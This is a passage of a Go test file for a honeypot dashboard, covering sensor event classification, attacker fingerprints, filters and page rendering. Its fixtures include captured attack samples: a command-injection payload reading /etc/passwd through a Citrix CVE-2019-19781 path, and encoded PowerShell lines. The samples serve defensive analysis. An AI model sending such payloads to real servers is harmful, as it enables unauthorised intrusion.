		t.Fatalf("cowrie source filter returned the wrong artifacts: %+v", filtered.Files)
	}
	if path, err := s.payloadPath(script); err != nil || path != filepath.Join(scripts, script) {
		t.Fatalf("nested script payload is not downloadable: path=%q err=%v", path, err)
	}
}

func TestInlineScriptCapture(t *testing.T) {
	dir := t.TempDir()
	s := &store{scriptDir: dir, payloadDirs: []string{dir}}
	ev := event{sensor: "cowrie", command: `powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHAAcgBvAGIAZQA=`, detail: "cmd"}
	s.captureScriptPayload(&ev)
	if !hashName.MatchString(ev.shasum) || ev.download != "inline:powershell" {
		t.Fatalf("script was not captured: %+v", ev)
	}
	if _, err := os.Stat(filepath.Join(dir, ev.shasum)); err != nil {
		t.Fatalf("captured script missing: %v", err)
	}
	a, err := s.analyzePayload(ev.shasum)
	if err != nil || a.ScriptType != "PowerShell" || len(a.Decoded) == 0 || a.RiskScore == 0 || len(a.Rules) == 0 {
		t.Fatalf("script analysis incomplete: analysis=%+v err=%v", a, err)
	}
}

func TestCowrieHASSHFingerprint(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.client.kex", "session": "63742cd576fd",
		"hassh": "f555226df1963d1d3c09daf865abdc9a", "protocol": "ssh",
	}, "cowrie")
	if ev.fingerprint != "f555226df1963d1d3c09daf865abdc9a" || ev.fingerKind != "HASSH" {
		t.Fatalf("HASSH was not normalized: %+v", ev)
	}
}

func TestCowrieJA4FingerprintOnTunneledTLS(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.direct-tcpip.ja4", "session": "63742cd576fd",
		"ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1", "dst_ip": "203.0.113.9", "dst_port": 443.0,
	}, "cowrie")
	if ev.fingerprint != "t13d1516h2_8daaf6152771_e5627efa2ab1" || ev.fingerKind != "JA4" {
		t.Fatalf("JA4 was not surfaced: %+v", ev)
	}
	if !strings.Contains(ev.detail, "203.0.113.9:443") {
		t.Fatalf("detail missing tunnel destination: %q", ev.detail)
	}
}

func TestCowrieJA4HFingerprintOnTunneledHTTP(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.direct-tcpip.ja4h", "session": "63742cd576fd",
		"ja4h": "ge11nn020000_1a2b3c4d5e6f", "dst_ip": "203.0.113.9", "dst_port": 80.0,
	}, "cowrie")
	if ev.fingerprint != "ge11nn020000_1a2b3c4d5e6f" || ev.fingerKind != "JA4H" {
		t.Fatalf("JA4H was not surfaced: %+v", ev)
	}
}

func TestCowrieClientFingerprintSurfacesPubkeyOffer(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.client.fingerprint", "session": "63742cd576fd",
		"username": "root", "type": "ssh-ed25519", "fingerprint": "aa:bb:cc:dd:ee:ff",
	}, "cowrie")
	if ev.fingerprint != "aa:bb:cc:dd:ee:ff" || ev.fingerKind != "SSH pubkey" {
		t.Fatalf("pubkey fingerprint was not surfaced: %+v", ev)
	}
	if ev.user != "root" {
		t.Fatalf("username not surfaced: %+v", ev)
	}
}

func TestFingerprintAndEnrichmentFilters(t *testing.T) {
	e := storedEvent{Fingerprint: "abc123", ASN: 64500, Org: "Example Networks", Provider: "hosting"}
	if !((filter{fingerprint: "abc123", asn: "AS64500", org: "Example Networks", provider: "hosting"}).match(e)) {
		t.Fatal("combined fingerprint/enrichment filter did not match")
	}
	if (filter{fingerprint: "different"}).match(e) {
		t.Fatal("different fingerprint unexpectedly matched")
	}
}

// #149: /events?family= pivots from a GitHub-analysis scanner attribution to
// the sessions that delivered a matching payload.
func TestFamilyFilterMatchesResolvedHashSet(t *testing.T) {
	esGitHubAnalysisResult(t,
		map[string]any{"sha256": shaA, "exit_status": "ok", "family": "Mirai"},
		map[string]any{"sha256": shaB, "exit_status": "ok", "family": "qbot"},
	)

	delivered := storedEvent{Shasum: shaA, Session: "session-a"}
	other := storedEvent{Shasum: shaB, Session: "session-b"}
	noPayload := storedEvent{Session: "session-c"}

	f := parseFilter(httptest.NewRequest("GET", "/events?family=mirai", nil))
	if !f.match(delivered) {
		t.Error("event delivering the attributed hash did not match ?family=mirai")
	}
	if f.match(other) {
		t.Error("event delivering a different family's hash matched")
	}
	if f.match(noPayload) {
		t.Error("event with no payload at all matched a family filter")
	}

	// Case-insensitive, matching githubAnalysisHashesForFamily's own
	// normalization -- a chip built from the exact casing GitHub-analysis
	// stored must still resolve the same set as a hand-typed query.
	if !parseFilter(httptest.NewRequest("GET", "/events?family=MIRAI", nil)).match(delivered) {
		t.Error("family filter must be case-insensitive")
	}

	// A family no scanner ever attributed must exclude every event, not act
	// as an unset filter -- the empty resolved set is the correct answer, and
	// falling through to "match everything" would silently broaden the
	// filter into every event that merely lacks a family.
	unknown := parseFilter(httptest.NewRequest("GET", "/events?family=doesnotexist", nil))
	if unknown.match(delivered) || unknown.match(other) || unknown.match(noPayload) {
		t.Error("an unmatched family must exclude every event, not fall through to match-all")
	}

	if got := parseFilter(httptest.NewRequest("GET", "/events", nil)); got.family != "" || len(got.familyHashes) != 0 {
		t.Errorf("no ?family= param should leave the filter inactive, got %+v", got)
	}
}

func TestFamilyFilterChipIsBounded(t *testing.T) {
	f := filter{family: strings.Repeat("a", familyDisplayCap+10)}
	chips := f.describe()
	found := false
	for _, chip := range chips {
		if strings.HasPrefix(chip, "family = ") {
			found = true
			if strings.HasSuffix(chip, strings.Repeat("a", familyDisplayCap+10)) {
				t.Error("family chip rendered an unbounded value")
			}
			if !strings.HasSuffix(chip, "…") {
				t.Errorf("family chip was not truncated: %q", chip)
			}
		}
	}
	if !found {
		t.Fatalf("no family chip in %v", chips)
	}
}

func TestFingerprintAndASNRowsLinkToExactEvents(t *testing.T) {
	fp := fingerprintRows(map[string]int{"HASSH\x00abc123": 4}, 10)
	if len(fp) != 1 || fp[0].Key != "HASSH: abc123" || fp[0].Link != "/events?fingerprint=abc123" {
		t.Fatalf("unexpected fingerprint row: %+v", fp)
	}
	asn := asnRows([]kv{{Key: "AS64500 Example Networks", Count: 3}})
	if len(asn) != 1 || asn[0].Link != "/events?asn=64500" {
		t.Fatalf("unexpected ASN row: %+v", asn)
	}
}

func TestMapPointsGeoJSON(t *testing.T) {
	// #228: a marker is a city (accumulated across every IP that geolocated
	// there), not a single IP -- the drill-down must filter by city+country,
	// not link to one arbitrary contributing IP.
	got := mapPointsGeoJSON([]mapPoint{{City: "Berlin", Country: "DE", Lat: 52.5, Lon: 13.4, Count: 9, IPCount: 4}})
	if got.Type != "FeatureCollection" || len(got.Features) != 1 {
		t.Fatalf("unexpected GeoJSON collection: %+v", got)
	}
	f := got.Features[0]
	if f.Geometry.Type != "Point" || f.Geometry.Coordinates != [2]float64{13.4, 52.5} {
		t.Fatalf("GeoJSON coordinates must be longitude, latitude: %+v", f.Geometry)
	}
	if f.Properties.Events != "/events?city=Berlin&country=DE" || f.Properties.Count != 9 || f.Properties.IPCount != 4 {
		t.Fatalf("incomplete map properties: %+v", f.Properties)
	}
}

func TestMapPointsGeoJSONFallsBackToCountryWhenCityUnresolved(t *testing.T) {
	got := mapPointsGeoJSON([]mapPoint{{Country: "DE", Lat: 51.0, Lon: 9.0, Count: 3, IPCount: 3}})
	events := got.Features[0].Properties.Events
	if events != "/events?country=DE" {
		t.Fatalf("want a country-only drill-down when city is unresolved, got %q", events)
	}
}

func TestCredentialRankingRejectsCommandAndProtocolArtifacts(t *testing.T) {
	valid := [][2]string{{"root", "admin"}, {"DOMAIN\\operator", ""}, {"admin", "p@ss word"}}
	for _, pair := range valid {
		if !validCredentialPair(pair[0], pair[1]) {
			t.Fatalf("valid credential pair rejected: %#v", pair)
		}
	}
	invalid := [][2]string{
		{"enable\x00", "linuxshell\x00"},
		{"system", "/bin/busybox UNSTABLE"},
		{"sh", "powershell -enc AAAA"},
		{"bad user", "password"},
	}
	for _, pair := range invalid {
		if validCredentialPair(pair[0], pair[1]) {
			t.Fatalf("command/protocol artifact accepted as credentials: %#v", pair)
		}
	}
}

func TestCredentialRowsKeepExactFilterAndExplainEmptyValues(t *testing.T) {
	rows := credentialRows([]kv{{Key: "root / ", Count: 2}})
	if len(rows) != 1 || rows[0].Key != "root / (empty)" || rows[0].Link != "/events?cred=root+%2F+" {
		t.Fatalf("unexpected credential row: %+v", rows)
	}
}

func TestProtocolDisplayNormalization(t *testing.T) {
	cases := map[string]string{
		"smbd": "smb", "mssqld": "mssql", "mysqld": "mysql",
		"SipCall": "sip", "SipSession": "sip", "mongod": "mongodb", "pptpd": "pptp", "SSH": "ssh",
	}
	for input, want := range cases {
		if got := normalizeProtocol(input); got != want {
			t.Fatalf("normalizeProtocol(%q) = %q, want %q", input, got, want)
		}
	}
}

// The overview reloads itself in place, so it has to honor the pause too —
// otherwise the one page that churns most would ignore the switch.
func TestOverviewRefreshHonorsTheLivePause(t *testing.T) {
	for _, expected := range []string{
		`window.HoneypotLive&&window.HoneypotLive.paused()`,
		`addEventListener('hp-live-resumed',refreshDashboard)`,
	} {
		if !strings.Contains(pageOverview, expected) {
			t.Fatalf("overview refresh script is missing %q", expected)
		}
	}
}

func TestOverviewRecentExcludesInternalAndCaptureHealthNoise(t *testing.T) {
	if !isOverviewNoise(storedEvent{Sensor: "suricata", Alert: "SURICATA IPv4 truncated packet"}) {
		t.Fatal("capture-health alert should not occupy the overview feed")
	}
	for _, ip := range []string{tunnelPeerIP, "127.0.0.1", "::1"} {
		if !isOverviewNoise(storedEvent{Sensor: "cowrie", SrcIP: ip}) {
			t.Fatalf("internal source %q should not be presented as an attacker", ip)
		}
	}
	if isOverviewNoise(storedEvent{Sensor: "cowrie", SrcIP: "203.0.113.7"}) {
		t.Fatal("public attacker event was removed from the overview")
	}
}

func TestOperationalSuricataWarningsAreNotRankedAsAttacks(t *testing.T) {
	for _, signature := range []string{"SURICATA AF-PACKET truncated packet", "SURICATA IPv4 truncated packet"} {
		if !isOperationalAlert(signature) {
			t.Fatalf("operational warning not recognized: %q", signature)
		}
	}
	if isOperationalAlert("ET SCAN Possible Nmap User-Agent Observed") {
		t.Fatal("attacker detection was classified as an operational warning")
	}
}

func TestCompactTextKeepsShortValuesAndEllipsizesLongValues(t *testing.T) {
	if got := compactText("whoami", 12); got != "whoami" {
		t.Fatalf("short command changed: %q", got)
	}
	if got := compactText("abcdefghijklmnop", 8); got != "abcdefg…" {
		t.Fatalf("long command not compacted: %q", got)
	}
}

func TestDashboardCSSAssetsAreEmbeddedAndReferenced(t *testing.T) {
	assets := map[string]int{
		"static/theme.css":                         10000,
		"static/hp-api.js":                         500,
		"static/hp-app.js":                         8000,
		"static/hp-modals.js":                      5000,
		"static/hp-evidence.js":                    4000,
		"static/hp-settings.js":                    8000,
		"static/leaflet.css":                       10000,
		"static/leaflet.js":                        100000,
		"static/LEAFLET-LICENSE.txt":               1000,
		"static/site.webmanifest":                  300,
		"static/apiary-compact-mark-for-dark.png":  1000,
		"static/apiary-compact-mark-for-light.png": 1000,
	}
	for name, minimum := range assets {
		data, err := staticAssets.ReadFile(name)
		if err != nil {
			t.Fatalf("required dashboard asset %q is not embedded: %v", name, err)
		}
		if len(data) < minimum {
			t.Fatalf("dashboard asset %q is unexpectedly small: %d bytes", name, len(data))
		}
	}
	for _, reference := range []string{"/static/theme.css", "/static/hp-api.js", "/static/hp-modals.js", "/static/hp-evidence.js", "/static/hp-app.js", "/static/leaflet.css", "/static/leaflet.js", "/static/site.webmanifest", "/static/apiary-compact-mark-for-dark.png", "/static/apiary-compact-mark-for-light.png"} {
		if !strings.Contains(pageTemplate, reference) {
			t.Fatalf("shared page template does not load %q", reference)
		}
	}
	manifest, err := staticAssets.ReadFile("static/site.webmanifest")
	if err != nil {
		t.Fatal(err)
	}
	for _, reference := range []string{`"name": "APIARY"`, `"start_url": "/"`, `"scope": "/"`, `"src": "icon-192.png"`, `"src": "icon-512.png"`} {
		if !strings.Contains(string(manifest), reference) {
			t.Fatalf("dashboard web manifest is missing %q", reference)
		}
	}
	adapter, err := staticAssets.ReadFile("static/hp-app.js")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(adapter), "window.replaceHoneypotPage = mountPage") {
		t.Fatal("dashboard enhancement layer does not expose the live-refresh content mount")
	}
	if !strings.Contains(pageTemplate, `document.querySelector("[data-hp-page-content]")`) || !strings.Contains(pageTemplate, "window.hydrateHoneypotOverview(next)") {
		t.Fatal("dashboard refresh does not target the server-rendered content container")
	}
	if !strings.Contains(string(adapter), "hydrateOverview") || !strings.Contains(string(adapter), "child !== mapCard") {
		t.Fatal("dashboard refresh does not preserve the connected Leaflet map")
	}
}

// TestSemanticShellIsServerRendered executes the overview page template with
// an empty snapshot and asserts the XORE theme shell primitives, every
// navigation route, and the command palette are present in the initial HTML.
func TestSemanticShellIsServerRendered(t *testing.T) {
	funcs := templateFuncs(nil, "")
	tmpl, err := template.New("t").Funcs(funcs).Parse(pageTemplate)
	if err != nil {
		t.Fatalf("dashboard template does not parse: %v", err)
	}
	var out strings.Builder
	if err := tmpl.ExecuteTemplate(&out, "page", snapshot{}); err != nil {
		t.Fatalf("overview page does not execute with an empty snapshot: %v", err)
	}
	html := out.String()
	for _, want := range []string{
		`class="app-shell"`, `class="app-toolbar"`, `app-toolbar__title`,
		`class="app-sidebar"`, `class="app-main"`, `sidebar__profile`,
		`id="hp-command-palette"`, `class="modal modal--palette"`, `data-hp-page-content`,
		`data-hp-theme-toggle`, `data-hp-alert-count`,
		// The palette resolves server-side, so it must be a real GET form: an
		// unrecognised query has to reach /search rather than be guessed at.
		`method="get" action="/search"`, `name="q"`,
		// LIVE is a switch, not a decoration: it pauses every refresh path.
		`data-hp-live-toggle`, `aria-pressed="false"`,
		`class="avatar" data-hp-user-avatar`, `data-hp-user-name`, `data-hp-user-role`,
		`id="hp-modal-root"`, `id="hp-confirm-backdrop"`, `role="alertdialog"`,
		`aria-hidden="true" inert`, `/static/hp-modals.js`,
		"/static/theme.css", `localStorage.getItem("hp-theme")`,
	} {
		if !strings.Contains(html, want) {
			t.Fatalf("rendered shell is missing %q", want)
		}
	}
	// Both sidebar controls were removed: the button did nothing, and the
	// recents rail was the only reason the shell wrote investigation routes
	// into local storage.
	for _, gone := range []string{`data-hp-recents`, `hp-new-investigation`, `data-hp-focus-investigation`} {
		if strings.Contains(html, gone) {
			t.Fatalf("rendered shell still carries the removed control %q", gone)
		}
	}
	// /ml-anomalies is conditional on behavior.show_ml_panels (#181, default
	// off) -- it belongs in TestMLAnomaliesNavReflectsShowMLPanels below, not
	// in this "always present" list.
	for _, route := range []string{
		"/", "/events", "/ips", "/campaigns",
		"/clusters", "/attackers", "/kill-chain", "/commands", "/recordings", "/payloads", "/payload-workbench/results",
		"/reports",
	} {
		if !strings.Contains(html, `data-hp-nav="`+route+`" href="`+route+`"`) {
			t.Fatalf("rendered shell is missing navigation route %q", route)
		}
	}
	// #257: Elasticsearch history and ingest dead letters moved out of the
	// primary Evidence nav into admin-only Settings panes -- ops/pipeline
	// diagnostics, not analyst investigation evidence. The routes themselves
	// still work (source-health and search link into them with specific
	// queries/metrics), just no longer as standalone sidebar items.
	// #344: source-health and alerts moved out of the sidebar the same way
	// -- both already have topbar icon-button equivalents (pipeline-health
	// icon, alerts bell with its unread badge), so the sidebar entries were
	// a second, redundant way to reach the same two pages. The routes
	// themselves are unaffected; only the sidebar <a data-hp-nav> is gone.
	for _, route := range []string{"/history", "/dead-letters", "/source-health", "/alerts"} {
		if strings.Contains(html, `data-hp-nav="`+route+`" href="`+route+`"`) {
			t.Fatalf("rendered shell still carries the removed sidebar nav route %q", route)
		}
	}
	// #1139: "/payload-workbench" (index), "/sandbox" (list), and
	// "/github-analysis" (list) merged into /payloads and
	// /payload-workbench/results -- their own sidebar entries are gone, not
	// just relabeled. The bare routes still work as redirects (main.go), and
	// /payload-workbench/results itself is asserted present above.
	for _, route := range []string{"/payload-workbench", "/sandbox", "/github-analysis"} {
		if strings.Contains(html, `data-hp-nav="`+route+`" href="`+route+`"`) {
			t.Fatalf("rendered shell still carries the merged-away sidebar nav route %q", route)
		}
	}
	if !strings.Contains(html, `data-hp-behavior-nav="show_ml_panels"`) || !strings.Contains(html, `data-hp-nav="/ml-anomalies" data-hp-behavior-nav="show_ml_panels" href="/ml-anomalies" hidden`) {
		t.Fatal("ML anomalies nav link must render present-but-hidden when show_ml_panels is off (compiled default) -- #479 needs it in the DOM so a live config save can reveal it without a page reload")
	}
	// #150: /llm-analysis reuses show_ml_panels (see dashboard.html's own
	// comment on that link) -- same present-but-hidden contract as
	// /ml-anomalies above.
	if !strings.Contains(html, `data-hp-nav="/llm-analysis" data-hp-behavior-nav="show_ml_panels" href="/llm-analysis" hidden`) {
		t.Fatal("LLM analysis nav link must render present-but-hidden when show_ml_panels is off (compiled default)")
	}
}

// #1142: before the first rebuild() cycle completes, every card on the
// overview page is empty for the same reason (no data has been collected
// yet), not because the honeypot is genuinely quiet -- rendering the SAME
// "no events"/"no sensor logs found"/etc. text either way makes a
// warming-up dashboard indistinguishable from a broken one. Ready (mirroring
// s.ready.Load(), set explicitly by the "/" handler, not by rebuild() --
// see snapshot's own doc comment) picks which of the two the page shows.
func TestOverviewShowsSkeletonPlaceholdersBeforeFirstRebuildInsteadOfEmptyStates(t *testing.T) {
	s := newSettingsAPITestStore(t, "admin")
	tmpl, err := template.New("t").Funcs(templateFuncs(s, "")).Parse(pageTemplate)
	if err != nil {
		t.Fatalf("dashboard template does not parse: %v", err)
	}

	render := func(snap snapshot) string {
		var out strings.Builder
		if err := tmpl.ExecuteTemplate(&out, "page", snap); err != nil {
			t.Fatalf("overview page does not execute: %v", err)
		}
		return out.String()
	}

	warmingHTML := render(snapshot{Ready: false})
	if !strings.Contains(warmingHTML, "skeleton") {
		t.Fatal("Ready=false with no data must render skeleton placeholders")
	}
	if !strings.Contains(warmingHTML, "Warming up") {
		t.Fatal("Ready=false must show the warming-up indicator in the header, not a zero-value timestamp")
	}
	for _, emptyState := range []string{
		"No events in the last 24 hours.", "no sensor logs found under /logs",
		"no events yet — waiting for traffic", "no payloads captured yet",
		"waiting for correlatable public source addresses",
	} {
		if strings.Contains(warmingHTML, emptyState) {
			t.Fatalf("Ready=false must not show the real empty-state text %q -- that reads as a genuinely quiet honeypot, not a warming-up dashboard", emptyState)
		}
	}

	quietHTML := render(snapshot{Ready: true})
	if strings.Contains(quietHTML, "skeleton") {
		t.Fatal("Ready=true with no data is a genuinely quiet honeypot, not a loading state -- must not show skeleton placeholders")
	}
	if strings.Contains(quietHTML, "Warming up") {
		t.Fatal("Ready=true must not show the warming-up indicator")
	}
	if !strings.Contains(quietHTML, "no sensor logs found under /logs") {
		t.Fatal("Ready=true with no sensors must still show its real empty state")
	}

	// Ready=false must not mask REAL data that already arrived -- a card
	// with content always wins over both the skeleton and the empty state,
	// regardless of Ready.
	readyFalseWithData := render(snapshot{Ready: false, Sensors: []sensorRow{{Name: "cowrie", Count: 3, State: "active"}}})
	if !strings.Contains(readyFalseWithData, ">cowrie<") {
		t.Fatal("real sensor data must render even while Ready=false, not be masked by the skeleton")
	}
}

// #478: the overview page's "Correlated campaigns" card used to reuse
// /campaigns' own full 17-column table verbatim (score/network/events/ips/
// sensors/ports/creds/files/alerts/ASNs/provider/fingerprints/sequence/why
// correlated/first/last/ES-link) -- far more than a glance-view card can
// show without every wide cell wrapping to several lines (confirmed live
// against production data). This asserts the overview now renders a
// 6-column summary (score/network/events/ips/sensors/last seen) with a link
// to the full table, while /campaigns itself keeps every column unchanged.
func TestOverviewCampaignsCardIsADeclutteredSummary(t *testing.T) {
	s := newSettingsAPITestStore(t, "admin")
	tmpl, err := template.New("t").Funcs(templateFuncs(s, "")).Parse(pageTemplate)
	if err != nil {
		t.Fatalf("dashboard template does not parse: %v", err)
	}
	snap := snapshot{Campaigns: []campaignRow{{
		CIDR: "203.0.113.0/24", Score: 90, Events: 1200, UniqueIPs: 4, Sensors: "cowrie dionaea",
		Ports: "22 23", Creds: 5, Payloads: 1, Alerts: 12, ASNs: "AS64500", Providers: "network",
		Fingerprints: 3, Sequence: "cowrie -> dionaea", First: "2026-08-01 00:00", Last: "2026-08-04 12:00",
		Link: "/investigate/cidr/203.0.113.0%2F24", Explanation: "cross-sensor activity",
	}}}
	var out strings.Builder
	if err := tmpl.ExecuteTemplate(&out, "page", snap); err != nil {
		t.Fatalf("overview page does not execute: %v", err)
	}
	html := out.String()

	if !strings.Contains(html, `<thead><tr><th>score</th><th>network</th><th>events</th><th>ips</th><th>sensors</th><th>last seen</th></tr></thead>`) {
		t.Fatal("overview campaigns card must render the 6-column summary header")
	}
	if !strings.Contains(html, `href="/campaigns"`) {
		t.Fatal("overview campaigns card must link to the full /campaigns table")
	}
	for _, detailOnly := range []string{">ports<", ">creds<", ">files<", ">alerts<", ">ASNs<", ">provider<", ">fingerprints<", ">sequence<", "why correlated"} {
		if strings.Contains(html, detailOnly) {
			t.Fatalf("overview campaigns summary must not carry detail-only column %q", detailOnly)
		}
	}
	if !strings.Contains(html, "203.0.113.0/24") || !strings.Contains(html, "2026-08-04 12:00") {
		t.Fatalf("overview campaigns summary must still render the row's network and last-seen values: %s", html)
	}
}

// #181: "Experimental ML/LLM panels" persisted correctly but nothing ever
// read it, so /ml-anomalies stayed reachable (nav and direct URL) regardless
// of the toggle. This asserts the nav link tracks the live setting, not just
// the compiled default asserted above.
//
// #479: the link itself is always rendered (data-hp-behavior-nav="show_ml_panels"
// marks it for hp-settings.js's live side-effect patch) -- only its `hidden`
// attribute tracks the setting now, so a config save can reveal/hide it
// without the reload the old "omit the tag entirely" approach required.
func TestMLAnomaliesNavReflectsShowMLPanels(t *testing.T) {
	off := renderOverview(t, nil)
	if !strings.Contains(off, `data-hp-nav="/ml-anomalies" data-hp-behavior-nav="show_ml_panels" href="/ml-anomalies" hidden`) {
		t.Fatal("nav link must be present-but-hidden while show_ml_panels is off")
	}
	on := renderOverview(t, func(c *dashboardConfig) { c.Behavior.ShowMLPanels = true })
	if !strings.Contains(on, `data-hp-nav="/ml-anomalies" data-hp-behavior-nav="show_ml_panels" href="/ml-anomalies">`) {
		t.Fatal("nav link must be visible (no hidden attribute) while show_ml_panels is on")
	}
	if strings.Contains(on, `data-hp-nav="/ml-anomalies" data-hp-behavior-nav="show_ml_panels" href="/ml-anomalies" hidden`) {
		t.Fatal("nav link must not carry hidden while show_ml_panels is on")
	}
	// #150: /llm-analysis tracks the same setting.
	if !strings.Contains(on, `data-hp-nav="/llm-analysis" data-hp-behavior-nav="show_ml_panels" href="/llm-analysis">`) {
		t.Fatal("LLM analysis nav link must be visible (no hidden attribute) while show_ml_panels is on")
	}
	if strings.Contains(on, `data-hp-nav="/llm-analysis" data-hp-behavior-nav="show_ml_panels" href="/llm-analysis" hidden`) {
		t.Fatal("LLM analysis nav link must not carry hidden while show_ml_panels is on")
	}
	// #154 phase 5: /agent-campaigns tracks the same setting.
	if !strings.Contains(off, `data-hp-nav="/agent-campaigns" data-hp-behavior-nav="show_ml_panels" href="/agent-campaigns" hidden`) {
		t.Fatal("agent campaigns nav link must be present-but-hidden while show_ml_panels is off")
	}
	if !strings.Contains(on, `data-hp-nav="/agent-campaigns" data-hp-behavior-nav="show_ml_panels" href="/agent-campaigns">`) {
		t.Fatal("agent campaigns nav link must be visible (no hidden attribute) while show_ml_panels is on")
	}
	if strings.Contains(on, `data-hp-nav="/agent-campaigns" data-hp-behavior-nav="show_ml_panels" href="/agent-campaigns" hidden`) {
		t.Fatal("agent campaigns nav link must not carry hidden while show_ml_panels is on")
	}
}

func TestRenderEngineSecurityPrimitives(t *testing.T) {
	first := nonce()
	second := nonce()
	if first == "" || second == "" || first == second {
		t.Fatalf("CSP nonces must be non-empty and unique: %q %q", first, second)
	}
	recorder := httptest.NewRecorder()
	secHeaders(recorder, first)
	policy := recorder.Header().Get("Content-Security-Policy")
	for _, want := range []string{
		"default-src 'self'", "'nonce-" + first + "'",
		"form-action 'self'", "base-uri 'none'", "frame-ancestors 'none'",
	} {
		if !strings.Contains(policy, want) {
			t.Fatalf("CSP is missing %q: %s", want, policy)
		}
	}
	if recorder.Header().Get("X-Content-Type-Options") != "nosniff" ||
		recorder.Header().Get("X-Frame-Options") != "DENY" {
		t.Fatalf("security headers are incomplete: %v", recorder.Header())
	}
}

func TestSharedPartialsComeFromEmbeddedUI(t *testing.T) {
	partial := mustReadUI("partials/dashboard.html")
	for _, want := range []string{
		`{{define "style"}}`, `{{define "sidebar"}}`, `{{define "topbar"}}`,
		`{{define "tbl"}}`, `{{define "techniques"}}`,
	} {
		if !strings.Contains(partial, want) {
			t.Fatalf("embedded dashboard partial is missing %q", want)
		}
	}
}

// Every route template now renders from the embedded ui tree. Assert both
// halves of that migration: each page file supplies the template names its Go
// binding claims, and no Go source declares a {{define}} of its own — a second
// definition of one name silently wins or fails to parse depending on
// concatenation order, which is exactly the regression this migration invites.
func TestRouteTemplatesRenderFromEmbeddedUI(t *testing.T) {
	pages := map[string][]string{
		"overview.html":                {"page"},
		"events.html":                  {"everow", "eventrows", "events"},
		"ips.html":                     {"iprow", "iprows", "ips", "attacker", "attacker-correlation-body", "attacker-block-body"},
		"session.html":                 {"session"},
		"intel.html":                   {"clusters", "clusters-body", "campaigns", "campaigns-body", "campaignrows", "cidr-correlation", "cidr-correlation-body", "cluster-correlation", "cluster-correlation-body", "commands"},
		"attackers.html":               {"attackers"},
		"kill_chain.html":              {"kill-chain"},
		"payloads.html":                {"payloadrow", "payloadrows", "payloads", "payload-analysis"},
		"payload_workbench.html":       {"workbench-results", "payload-workbench"},
		"sandbox.html":                 {"sandbox"},
		"ghidra.html":                  {"ghidra"},
		"history.html":                 {"history"},
		"dead_letters.html":            {"dead-letters"},
		"source_health.html":           {"source-health"},
		"alerts.html":                  {"alerts"},
		"reports.html":                 {"reports"},
		"search.html":                  {"search"},
		"partials/settings_modal.html": {"settingsModal"},
	}
	for name, names := range pages {
		body := mustReadUI(name)
		for _, define := range names {
			if !strings.Contains(body, `{{define "`+define+`"}}`) {
				t.Fatalf("embedded %s is missing the %q template", name, define)
			}
		}
		if !strings.Contains(pageTemplate, body) {
			t.Fatalf("pageTemplate does not include embedded %s", name)
		}
	}
	sources, err := filepath.Glob("*.go")
	if err != nil {
		t.Fatal(err)
	}
	for _, source := range sources {
		if strings.HasSuffix(source, "_test.go") {
			continue
		}
		body, err := os.ReadFile(source)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(body), `{{define "`) {
			t.Fatalf("%s declares a template inline; route markup belongs in dashboard/ui/", source)
		}
	}
}

// TestClassifyDicompotSurfacesDIMSEOperation is a regression test: a prior
// version of classify() had no branch for any of the five #238 ES-only
// sensors added after multipot, so every one of them fell through to the
// generic fallback and only ever showed the raw "event" field -- losing
// exactly the detail (DICOM operation + SOP class, DNS query domain,
// HTTP path, captured exploit payload, RDP username) that makes any of
// these events worth looking at.
func TestClassifyDicompotSurfacesDIMSEOperation(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "dicompot", "event": "c_store", "port": float64(11112),
		"src_ip": "203.0.113.10", "data": "1.2.840.10008.5.1.4.1.1.7 1.2.3.4.5", "bytes": float64(4096),
	}, "dicompot")
	if ev.skip || ev.sensor != "dicompot" || ev.proto != "dicom" {
		t.Fatalf("unexpected: %+v", ev)
	}
	if !strings.Contains(ev.detail, "C-STORE") || !strings.Contains(ev.detail, "4096 bytes") {
		t.Fatalf("detail missing DIMSE operation/size: %q", ev.detail)
	}
}

func TestClassifyDicompotSkipsListening(t *testing.T) {
	ev := classify(map[string]any{"sensor": "dicompot", "event": "listening", "port": float64(11112)}, "dicompot")
	if !ev.skip {
		t.Fatal("dicompot's startup 'listening' event should be skipped, not shown as a dashboard row")
	}
}

func TestClassifyDNSHoneypotSurfacesQueriedDomain(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "dns-honeypot", "event": "query", "port": float64(53),
		"src_ip": "203.0.113.10", "query": "malicious.example.com", "qtype": float64(1),
	}, "dns-honeypot")
	if ev.skip || ev.sensor != "dns-honeypot" || ev.proto != "dns" {
		t.Fatalf("unexpected: %+v", ev)
	}
	if ev.path != "malicious.example.com" {
		t.Fatalf("path (queried domain) = %q, want malicious.example.com", ev.path)
	}
	if !strings.Contains(ev.detail, "malicious.example.com") || !strings.Contains(ev.detail, "A") {
		t.Fatalf("detail missing domain/qtype: %q", ev.detail)
	}
}

func TestClassifyDNSHoneypotFlagsNonStandardOpcode(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "dns-honeypot", "event": "query", "port": float64(53),
		"src_ip": "203.0.113.10", "query": "example.com", "qtype": float64(1), "opcode": float64(5),
	}, "dns-honeypot")
	if !strings.Contains(ev.detail, "UPDATE") {
		t.Fatalf("detail missing non-standard opcode name: %q", ev.detail)
	}

	// opcode 0 (QUERY) is virtually all real traffic and must not clutter
	// every single row.
	standard := classify(map[string]any{
		"sensor": "dns-honeypot", "event": "query", "port": float64(53),
		"src_ip": "203.0.113.10", "query": "example.com", "qtype": float64(1), "opcode": float64(0),
	}, "dns-honeypot")
	if strings.Contains(standard.detail, "opcode") {
		t.Fatalf("standard QUERY opcode should not be flagged in detail: %q", standard.detail)
	}
}

func TestClassifyCitrixHoneypotSurfacesPathAndPayload(t *testing.T) {
	ev := classify(map[string]any{
		"sensor": "citrix-honeypot", "event": "cve_2019_19781_payload", "port": float64(443),
		"src_ip": "203.0.113.10", "path": "/vpns/portal/scripts/newbm.pl", "data": "id; cat /etc/passwd",
	}, "citrix-honeypot")
	if ev.skip || ev.sensor != "citrix-honeypot" {
		t.Fatalf("unexpected: %+v", ev)
	}
	if ev.path != "/vpns/portal/scripts/newbm.pl" {
		t.Fatalf("path = %q", ev.path)
	}
